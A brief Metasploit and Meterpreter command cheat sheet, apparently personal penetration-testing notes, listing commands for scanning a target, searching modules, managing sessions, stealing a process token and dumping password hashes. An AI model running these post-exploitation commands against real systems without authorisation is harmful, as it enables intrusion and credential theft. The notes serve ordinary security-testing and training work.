# Shell
## Start Msfconsole
- starts an msfconsole session without a database
```shell
msfconsole
```

## Start Msfconsole with Database
- starts an msfconsole session with access to the database
```bash
sudo msfdb run
```

---
# Msfconsole

## Nmap Scan
```msfconsole
db_nmap -sV -p- -T5 -A [TARGET_IP]
```

## Search Example
```msfconsole
search type:[TYPE] platform:[TARGET_OS]
```
## Set LHOST
- Sets the local host to the address from the desired network
```msfconsole
set LHOST tun0
```

## Local Exploit Suggester
- A module  that takes an existing session and suggests possible exploits that can be ran to gain privilege escalation.
```msfconsole
search local_exploit_suggester 
```

---
# Meterpreter
## Run as Job
- Run an exploit in the background as a job
```meterpreter
exploit -j
```
## Jobs - List
- List all active jobs
```Meterpreter
jobs -l
```
## Sessions - List
- list all active sessions
```Meterpreter
sessions -l
```
## Sessions - Interact
- Interact with an active session
```Meterpreter
Sessions -i [SESSION_ID]
```

## Process List
- Lists the running processes
```meterpreter
ps
```

## Steal Token
- Steals the token from a running process to attempt to gain privilege.
```meterpreter
steal_token [PID]
```

## Background Session
- Places the current session in the background.
```meterpreter
bg
```

## Hash Dump 
- a command that dumps all the hashes 
```meterpreter
hashdump
```

---

